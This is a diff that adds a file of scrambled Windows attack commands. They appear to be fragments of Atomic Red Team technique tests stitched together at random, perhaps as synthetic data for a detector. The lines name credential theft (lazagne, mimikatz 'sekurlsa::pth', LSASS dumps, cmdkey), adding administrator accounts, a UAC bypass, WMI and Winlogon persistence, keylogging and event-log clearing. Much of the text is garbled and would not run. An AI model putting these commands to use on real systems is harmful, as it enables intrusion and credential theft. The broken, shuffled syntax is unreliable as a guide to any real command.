@@ -1,0 +1,64 @@
+namp -sn $ { output_zip_name } /add
+net group `` appinit_dlls /user `` $ { new_time }
+net user administrator /add
+gpresult /z
+copy `` localaccount=true /user : \software\microsoft\command \ $ filter = ) file `` filter = set-wmiinstance @ ( execution processors\atomicredteam '' ' execution options\svchost.exe '' `` threadingmodel '' `` administrators '' $ filter ;
+net localgroup administrators
+set win32_group
+add `` /y $ : /v administrators } in { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5
+bypassuac.exe -w $ { filename_regex }
+$ shortcut.windowstyle -l ;
+cmdkey /list
+namp -sn $ domain
+get-ciminstance -classname win32_processor ) \\ $ ( ) = hklm\software\microsoft\windows set-wmiinstance -namespace -comobject wscript.shell ;
+net user $ `` hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist ;
+python make_image.py $ { -path $ { filename_regex }
+net shortcut = `` $ { name='atomicredteam-wmipersistence-activescripteventconsumer-example ; all
+wscript $ shortcut = `` `` $ { filename_regex }
+curl http : set-wmiinstance -namespace /format : 240 $ shell.createshortcut delete = set-wmiinstance , keylog
+bypassuac.exe $ : username
+get-localgroupmember -group `` administrators '' /t reg_dword /d bypass
+python archive_file.py $ { source_file } -l `` $ wscriptshell.createshortcut ( `` atomic \system32\osk.exe
+quser
+net stop
+namp -sn $ { vbs_script }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /t reg_dword /d `` enabled '' /v dllname /d `` atomictest.dll :
+net user = `` /y $ { domain admins ''
+ipconfig
+ffuf -w } -w $ consumerargs
+curl http : new-object net.securityprotocoltype -list | localappdata % \microsoft\teams\current\teams.exe
+bitsadmin.exe /create $ wscriptshell.createshortcut ( `` @ volumn name volumn name you create = set-wmiinstance file set-wmiinstance name administrators
+lazagne.exe windows
+bitsadmin.exe /complete $ { /users
+assoc $ { malicious_exe_path } eventnamespace='root\cimv2 ; /grant administrators : = keylog
+get-localgroupmember -group shortcut = administrators c : cor_profiler
+conhost.exe [ -list | foreach-object ( new-object net.webclient ) \\ $ ( new-object net.webclient ) \\ $ ( clear-eventlog processor '' -name = set-wmiinstance , new-object -list ] : os ' ' ; querylanguage= :frombase64string ( = [ net.securityprotocoltype ] : :tls12
+`` [ net.servicepointmanager ] : :dcsync ) \\ ( $ ( `` ( set-wmiinstance -namespace minidump execution options\mshta.exe ;
+$ shortcut = `` defaultaccount ;
+quser
+net user user /add
+cmdkey.exe /list
+net user /add $ wscriptshell.createshortcut { username } \inprocserver32 , $ i -l $ ( shadow username ) in = ( `` $ { filter = `` $ filter ;
+rdrleakdiag.exe /p 0 volumn name you create = `` administrators c : windir execution set-wmiinstance file file filter = source_file_path ) \\ : set-wmiinstance name administrators : set-wmiinstance you administrators : keylog
+net accounts
+net user user administrator
+net localgroup administrators
+net user administrator /add
+net group `` hklm\system\currentcontrolset\control\session `` dllname '' -name `` minidump execution \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' ;
+net localgroup administrators administrators $ wscriptshell.createshortcut hklm\software\microsoft\windows domain
+.\procdump.exe -r /user and -a : -o .\redirect.sdb
+net user $ { directory_path }
+del $ ( `` $ env : cor_profiler
+net accounts
+net user administrator /add
+esentutl.exe `` http : :credman
+copy $ filterargs binpath= /user 5
+net user administrator /add
+net user administrator /add
+cmdkey /list
+sekurlsa : :pth -executionpolicy 'https : \windows\temp\lsass_dump.dmp
+rundll32 popcalc.dll , keylog
+net group `` hklm\software\microsoft\active nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword )
+namp -sn $ { file_name } -windowstyle @ volumn or output_zip_name { ip_address command= $ { components\atomic_test '' ) @ `` filter = `` $ filter = `` installscreensaver '' `` $ filter ; -t = `` $ filter ;
+net user administrator = `` cor_profiler
+nbtstat -n
